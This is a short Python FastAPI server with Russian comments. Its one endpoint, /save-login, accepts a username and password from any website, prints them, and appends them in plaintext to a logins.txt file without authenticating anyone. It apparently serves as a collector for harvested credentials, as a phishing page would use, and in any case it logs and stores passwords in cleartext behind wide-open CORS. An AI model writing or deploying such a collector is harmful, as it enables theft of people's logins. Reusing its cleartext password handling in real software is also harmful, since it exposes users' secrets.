from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from datetime import datetime

app = FastAPI()

# Настройка CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Разрешить все источники
    allow_credentials=True,
    allow_methods=["*"],  # Разрешить все методы (GET, POST и т.д.)
    allow_headers=["*"],  # Разрешить все заголовки
)

# Модель данных для получения логина и пароля
class LoginData(BaseModel):
    username: str
    password: str

# Эндпоинт для сохранения логина и пароля в файл
@app.post("/save-login")
async def save_login(data: LoginData):
    print(f"Received data: {data}")  # Логируем полученные данные

    log_entry = f"{datetime.now()}: Username: {data.username}, Password: {data.password}\n"

    with open("logins.txt", "a") as file:
        file.write(log_entry)

    return {"message": "Login details saved successfully"}
